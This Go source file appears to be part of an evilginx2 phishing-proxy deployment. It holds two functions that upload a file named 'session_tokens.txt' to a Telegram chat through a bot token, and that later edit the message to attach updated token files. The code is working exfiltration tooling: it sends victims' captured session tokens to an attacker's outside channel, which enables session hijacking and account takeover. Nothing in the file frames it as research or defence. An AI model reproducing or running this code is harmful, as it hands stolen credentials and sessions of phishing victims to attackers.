package core

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"strconv"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"github.com/kgretzky/evilginx2/log"
)

// MaxTelegramMessageLength is the maximum size of a Telegram message (4096 characters).
const MaxTelegramMessageLength = 4096

func sendTelegramNotification(chatID string, token string, message string, txtFilePath string) (int, error) {
	bot, err := tgbotapi.NewBotAPI(token)
	if err != nil {
		return 0, fmt.Errorf("failed to create Telegram bot: %v", err)
	}

	chatIDInt, err := strconv.ParseInt(chatID, 10, 64)
	if err != nil {
		return 0, fmt.Errorf("invalid chat ID format: %v", err)
	}

	file, err := os.Open(txtFilePath)
	if err != nil {
		return 0, fmt.Errorf("error opening TXT file: %v", err)
	}
	defer file.Close()

	doc := tgbotapi.NewDocument(chatIDInt, tgbotapi.FileReader{
		Name:   "session_tokens.txt",
		Reader: file,
	})
	doc.Caption = message
	doc.ParseMode = "MarkdownV2"

	msg, err := bot.Send(doc)
	if err != nil {
		return 0, fmt.Errorf("error sending TXT file: %v", err)
	}

	log.Debug("telegram: message sent successfully (ID: %d)", msg.MessageID)
	return msg.MessageID, nil
}

func editMessageFile(chatID string, token string, messageID int, txtFilePath string, msg_body string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/editMessageMedia", token)

	// Open the TXT file
	file, err := os.Open(txtFilePath)
	if err != nil {
		return fmt.Errorf("error opening TXT file: %v", err)
	}
	defer file.Close()

	// Create a multipart form request
	var requestBody bytes.Buffer
	writer := multipart.NewWriter(&requestBody)

	// Add chat_id, message_id, and media fields
	_ = writer.WriteField("chat_id", chatID)
	_ = writer.WriteField("message_id", fmt.Sprintf("%d", messageID))
	media := map[string]interface{}{
		"type":       "document",
		"media":      "attach://file",
		"caption":    msg_body,
		"parse_mode": "MarkdownV2",
	}
	mediaJSON, _ := json.Marshal(media)
	_ = writer.WriteField("media", string(mediaJSON))

	// Add the file as a form field
	filePart, err := writer.CreateFormFile("file", txtFilePath)
	if err != nil {
		return fmt.Errorf("error creating form file: %v", err)
	}
	_, err = io.Copy(filePart, file)
	if err != nil {
		return fmt.Errorf("error copying file to form: %v", err)
	}

	// Close the writer
	writer.Close()

	// Send the request
	req, err := http.NewRequest("POST", url, &requestBody)
	if err != nil {
		return fmt.Errorf("error creating HTTP request: %v", err)
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("error sending HTTP request: %v", err)
	}
	defer resp.Body.Close()

	// Check for success response
	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("failed to edit message: %s", string(body))
	}

	fmt.Println("Message edited successfully with updated file.")
	return nil
}
